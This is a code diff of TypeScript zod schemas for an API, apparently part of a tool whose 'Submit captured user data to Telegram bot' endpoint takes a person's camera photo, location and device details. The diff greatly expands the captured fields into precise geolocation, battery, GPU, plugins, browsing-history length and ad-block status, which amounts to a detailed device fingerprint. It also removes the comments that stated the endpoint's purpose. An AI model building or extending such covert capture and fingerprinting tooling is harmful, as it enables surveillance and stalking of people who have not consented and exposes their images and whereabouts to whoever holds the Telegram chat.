@@ -9,7 +9,6 @@ import * as zod from 'zod';
 
 
 /**
- * Returns server health status
  * @summary Health check
  */
 export const HealthCheckResponse = zod.object({
@@ -18,27 +17,72 @@ export const HealthCheckResponse = zod.object({
 
 
 /**
- * Receives camera photo, location, and device info and sends it to the Telegram bot for the given chat_id
  * @summary Submit captured user data to Telegram bot
  */
 export const SubmitCaptureBody = zod.object({
-  "chatId": zod.string().describe('Telegram chat ID to send data to'),
-  "photo": zod.string().nullish().describe('Base64 encoded photo from camera (data URL)'),
+  "chatId": zod.string(),
+  "photo": zod.string().nullish(),
   "location": zod.object({
-  "latitude": zod.number().optional(),
-  "longitude": zod.number().optional(),
+  "latitude": zod.number().nullish(),
+  "longitude": zod.number().nullish(),
   "accuracy": zod.number().nullish(),
+  "altitude": zod.number().nullish(),
+  "altitudeAccuracy": zod.number().nullish(),
+  "heading": zod.number().nullish(),
+  "speed": zod.number().nullish(),
   "city": zod.string().nullish()
 }).optional(),
   "deviceInfo": zod.object({
   "userAgent": zod.string().optional(),
   "platform": zod.string().optional(),
+  "vendor": zod.string().optional(),
+  "language": zod.string().optional(),
+  "languages": zod.array(zod.string()).optional(),
+  "timezone": zod.string().optional(),
+  "timezoneOffset": zod.number().nullish(),
+  "cookieEnabled": zod.boolean().optional(),
+  "doNotTrack": zod.string().nullish(),
+  "onLine": zod.boolean().optional(),
+  "hardwareConcurrency": zod.number().nullish(),
+  "deviceMemory": zod.number().nullish(),
+  "maxTouchPoints": zod.number().nullish(),
   "screenWidth": zod.number().optional(),
   "screenHeight": zod.number().optional(),
-  "language": zod.string().optional(),
-  "timezone": zod.string().optional(),
-  "battery": zod.number().nullish().describe('Battery level 0-100'),
-  "connectionType": zod.string().nullish()
+  "screenAvailWidth": zod.number().nullish(),
+  "screenAvailHeight": zod.number().nullish(),
+  "colorDepth": zod.number().nullish(),
+  "pixelDepth": zod.number().nullish(),
+  "devicePixelRatio": zod.number().nullish(),
+  "innerWidth": zod.number().nullish(),
+  "innerHeight": zod.number().nullish(),
+  "orientationType": zod.string().nullish(),
+  "orientationAngle": zod.number().nullish(),
+  "battery": zod.number().nullish(),
+  "charging": zod.boolean().nullish(),
+  "chargingTime": zod.number().nullish(),
+  "dischargingTime": zod.number().nullish(),
+  "connectionType": zod.string().nullish(),
+  "connectionDownlink": zod.number().nullish(),
+  "connectionRtt": zod.number().nullish(),
+  "connectionSaveData": zod.boolean().nullish(),
+  "gpuRenderer": zod.string().nullish(),
+  "gpuVendor": zod.string().nullish(),
+  "webglSupported": zod.boolean().nullish(),
+  "webAssemblySupported": zod.boolean().nullish(),
+  "serviceWorkerSupported": zod.boolean().nullish(),
+  "notificationPermission": zod.string().nullish(),
+  "cameraCount": zod.number().nullish(),
+  "microphoneCount": zod.number().nullish(),
+  "pluginsCount": zod.number().nullish(),
+  "pluginsList": zod.array(zod.string()).optional(),
+  "referrer": zod.string().nullish(),
+  "historyLength": zod.number().nullish(),
+  "pdfViewerEnabled": zod.boolean().nullish(),
+  "cookiesBlocked": zod.boolean().nullish(),
+  "localStorageEnabled": zod.boolean().nullish(),
+  "sessionStorageEnabled": zod.boolean().nullish(),
+  "indexedDbEnabled": zod.boolean().nullish(),
+  "adBlockEnabled": zod.boolean().nullish()
 }).optional()
 })
 
